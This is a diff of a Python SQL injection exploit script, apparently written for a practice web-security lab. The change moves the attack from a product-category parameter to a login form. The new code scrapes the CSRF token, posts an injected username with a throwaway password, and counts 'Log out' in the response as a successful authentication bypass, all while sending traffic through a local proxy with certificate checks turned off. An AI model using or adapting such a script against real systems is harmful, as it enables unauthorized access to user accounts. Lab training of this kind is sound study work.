@@ -1,8 +1,10 @@
 import sys
+from typing import Optional
 
 import requests
 import urllib3
 from bs4 import BeautifulSoup
+from bs4.element import Tag
 
 urllib3.disable_warnings()
 
@@ -14,18 +16,23 @@ proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
 def get_csrf_token(session, base_url):
     r = session.get(base_url, proxies=proxies, verify=False, timeout=5)
     soup = BeautifulSoup(r.text, "html.parser")
-    csrf = soup.find("input")["value"]
-    return csrf
+    csrf: Optional[Tag] = soup.find("input", type="hidden")
+
+    if csrf is not None:
+        return csrf["value"]
+
+    return 'not csrf token'
 
 
 def exploit_sqli(session, base_url, payload_entered):
     # this time we want to URL encode the params:
-    crf = get_csrf_token(session, base_url)
-    params = {"category": payload_entered}
+    csrf = get_csrf_token(session, base_url)
+    print(csrf)
+    data = {"csrf": csrf, "username": payload_entered, "password": "randomtext"}
 
-    r = requests.get(base_url, params=params, proxies=proxies, verify=False, timeout=5)
+    r = session.post(base_url, data=data, proxies=proxies, verify=False, timeout=5)
     print(r.text)
-    if "Waterproof Tea Bags" in r.text:
+    if "Log out" in r.text:
         return True
     return False
 
